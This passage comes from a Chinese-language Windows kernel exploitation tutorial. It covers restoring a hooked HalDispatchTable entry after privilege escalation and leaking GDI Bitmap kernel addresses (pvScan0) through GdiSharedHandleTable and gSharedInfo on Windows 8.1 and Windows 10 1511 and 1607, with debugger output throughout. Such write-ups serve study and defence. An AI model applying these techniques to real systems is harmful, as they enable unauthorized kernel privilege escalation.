    ffffd000`27acf9a8  00000000`00000000
    ffffd000`27acf9b0  00000000`00000000
    ffffd000`27acf9b8  00000000`00000000
    ffffd000`27acf9c0  00000000`00000000
    ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e
    ffffd000`27acf9d0  00000000`00000000
    ffffd000`27acf9d8  00000000`00000000
    ffffd000`27acf9e0  00000000`00000000
    ffffd000`27acf9e8  00000000`00000000
    ffffd000`27acf9f0  00000000`00000000
    1: kd> u 00000000`0010033e
    00000000`0010033e 4883ec30        sub     rsp,30h
    00000000`00100342 48b875ff142103f8ffff mov rax,offset nt!KeQueryIntervalProfile+0x25 (fffff803`2114ff75)
    00000000`0010034c 48890424        mov     qword ptr [rsp],rax
    00000000`00100350 c3              ret
    00000000`00100351 cc              int     3
    00000000`00100352 cc              int     3
    00000000`00100353 cc              int     3
    00000000`00100354 cc              int     3
`nt!KeQueryIntervalProfile+0x25`是哪里呢，这个值刚好是我们Hook位置的下一句汇编，我们将其放回原位即可做到原封不动的还原内核函数，这样就可以完美的提权而不蓝屏
    0: kd> u nt!KeQueryIntervalProfile
    nt!KeQueryIntervalProfile:
    fffff803`2114ff50 4883ec48        sub     rsp,48h
    fffff803`2114ff54 83f901          cmp     ecx,1
    fffff803`2114ff57 7430            je      nt!KeQueryIntervalProfile+0x39 (fffff803`2114ff89)
    fffff803`2114ff59 ba18000000      mov     edx,18h
    fffff803`2114ff5e 894c2420        mov     dword ptr [rsp+20h],ecx
    fffff803`2114ff62 4c8d4c2450      lea     r9,[rsp+50h]
    fffff803`2114ff67 8d4ae9          lea     ecx,[rdx-17h]
    fffff803`2114ff6a 4c8d442420      lea     r8,[rsp+20h]
    0: kd> u
    nt!KeQueryIntervalProfile+0x1f:
    fffff803`2114ff6f ff15f377ddff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff803`20f27768)]
    fffff803`2114ff75 85c0            test    eax,eax // nt!KeQueryIntervalProfile+0x25
    fffff803`2114ff77 7818            js      nt!KeQueryIntervalProfile+0x41 (fffff803`2114ff91)
    fffff803`2114ff79 807c242400      cmp     byte ptr [rsp+24h],0
    fffff803`2114ff7e 7411            je      nt!KeQueryIntervalProfile+0x41 (fffff803`2114ff91)
    fffff803`2114ff80 8b442428        mov     eax,dword ptr [rsp+28h]
    fffff803`2114ff84 4883c448        add     rsp,48h
    fffff803`2114ff88 c3              ret
# 0x02：Windows 10 1511-1607 x64下的利用
好了我们整理完了win
8.1下的一些坑我们开始我们在win10中的利用，win8.1中最浪费时间的操作便是堆栈的平衡问题，那我们可不可以有更简单的方法提权呢？当然有的，我们都有任意读写的权限了不是吗，既然有任意读写的权限，那么我们完全可以用任意读写的操作实现对token的替换，我们甚至不用我们的shellcode都可以提权，这种做法非常的简便，并不需要考虑shellcode在内核中运行遇到的堆栈平衡问题，我们的关键点始终还是在泄露pvScan0的地方，我们在win
10 1607和win 10 1511中观察一下我们创建的Bitmap结构，和win 8.1进行比较，构造如下代码片段
    int main()
    {
        HBITMAP hBitmap = CreateBitmap(0x10, 2, 1, 8, NULL);
        __debugbreak();
        return 0;
    }
**Win 8.1 x64**
    0: kd> dt ntdll!_PEB -b GdiSharedHandleTable @$Peb
       +0x0f8 GdiSharedHandleTable : 0x000000c4`d0540000 
    0: kd> ? rax&ffff
    Evaluate expression: 1984 = 00000000`000007c0
    0: kd> dq 0x000000c4`d0540000+0x18*7c0
    000000c4`d054ba00  fffff901`40701010 40053105`00000c3c
    000000c4`d054ba10  00000000`00000000 fffff901`43c5d010
    000000c4`d054ba20  40012201`00000c3c 000000c4`d0170b60
    000000c4`d054ba30  fffff901`446c4190 41051405`00000000
    000000c4`d054ba40  00000000`00000000 fffff901`400d6ab0
    000000c4`d054ba50  40084308`00000000 00000000`00000000
    000000c4`d054ba60  00000000`00000776 44003501`00000000
    000000c4`d054ba70  00000000`00000000 fffff901`407e6010
    0: kd> dq fffff901`40701010
    fffff901`40701010  00000000`310507c0 80000000`00000000
    fffff901`40701020  00000000`00000000 00000000`00000000
    fffff901`40701030  00000000`310507c0 00000000`00000000
    fffff901`40701040  00000000`00000000 00000002`00000010
    fffff901`40701050  00000000`00000020 fffff901`40701268
    fffff901`40701060  fffff901`40701268 00002472`00000010
    fffff901`40701070  00010000`00000003 00000000`00000000
    fffff901`40701080  00000000`04800200 00000000`00000000
**Win 10 1511 x64**
    0: kd> dt ntdll!_PEB -b GdiSharedHandleTable @$Peb
       +0x0f8 GdiSharedHandleTable : 0x00000216`aa740000 
    0: kd> ? rax&ffff
    Evaluate expression: 2711 = 00000000`00000a97
    0: kd> dq 0x00000216`aa740000+0x18*a97
    00000216`aa74fe28  fffff901`4222aca0 4005e605`00000dec
    00000216`aa74fe38  00000000`00000000 00000000`00000936
    00000216`aa74fe48  40004205`00000000 00000000`00000000
    00000216`aa74fe58  00000000`00000a98 40004105`00000000
    00000216`aa74fe68  00000000`00000000 fffff901`441e4380
    00000216`aa74fe78  40102310`000006c8 000001fc`d4640fc0
    00000216`aa74fe88  00000000`00000abf 40008404`00000000
    00000216`aa74fe98  00000000`00000000 fffff901`406d94d0
    0: kd> dq fffff901`4222aca0
    fffff901`4222aca0  ffffffff`e6050a97 80000000`00000000
    fffff901`4222acb0  00000000`00000000 00000000`00000000
    fffff901`4222acc0  ffffffff`e6050a97 00000000`00000000
    fffff901`4222acd0  00000000`00000000 00000002`00000010
    fffff901`4222ace0  00000000`00000020 fffff901`4222aef8
    fffff901`4222acf0  fffff901`4222aef8 00008999`00000010
    fffff901`4222ad00  00010000`00000003 00000000`00000000
    fffff901`4222ad10  00000000`04800200 00000000`00000000
**Win 10 1607 x64**
    3: kd> dt ntdll!_PEB -b GdiSharedHandleTable @$Peb
       +0x0f8 GdiSharedHandleTable : 0x0000023e`1a210000 
    3: kd> ? rax&ffff
    Evaluate expression: 3111 = 00000000`00000c27
    3: kd> dq 0x0000023e`1a210000+0x18*c27
    0000023e`1a2223a8  ffffffff`ff540c27 00055405`00001a20
    0000023e`1a2223b8  00000000`00000000 00000000`00000b3e
    0000023e`1a2223c8  0000600a`00000001 00000000`00000000
    0000023e`1a2223d8  00000000`00000a90 00004104`00000001
    0000023e`1a2223e8  00000000`00000000 00000000`00000aea
    0000023e`1a2223f8  00003505`00000001 00000000`00000000
    0000023e`1a222408  ffffffff`ff810c2b 00018101`00000918
    0000023e`1a222418  0000019d`678a0820 00000000`00000acc
    3: kd> dq ffffffff`ff540c27
    ffffffff`ff540c27  ????????`???????? ????????`????????
    ffffffff`ff540c37  ????????`???????? ????????`????????
    ffffffff`ff540c47  ????????`???????? ????????`????????
    ffffffff`ff540c57  ????????`???????? ????????`????????
    ffffffff`ff540c67  ????????`???????? ????????`????????
    ffffffff`ff540c77  ????????`???????? ????????`????????
    ffffffff`ff540c87  ????????`???????? ????????`????????
    ffffffff`ff540c97  ????????`???????? ????????`????????
实验中很明显的发现win 10
1607中我们的`GdiShreadHanldleTable`已经不是一个指针了，我们来看看有什么升级，图片中说明了已经不能够公开这个句柄表的地址了,那是不是就没办法了呢?
当然不是!我们总能够通过各种方法来泄露我们的 PrvScan0 ，这里就需要引入另外一个比较神奇的结构`gSharedInfo`
    typedef struct _SHAREDINFO {
        PSERVERINFO psi;
        PUSER_HANDLE_ENTRY aheList;
        ULONG HeEntrySize;
        ULONG_PTR pDispInfo;
        ULONG_PTR ulSharedDelts;
        ULONG_PTR awmControl;
        ULONG_PTR DefWindowMsgs;
        ULONG_PTR DefWindowSpecMsgs;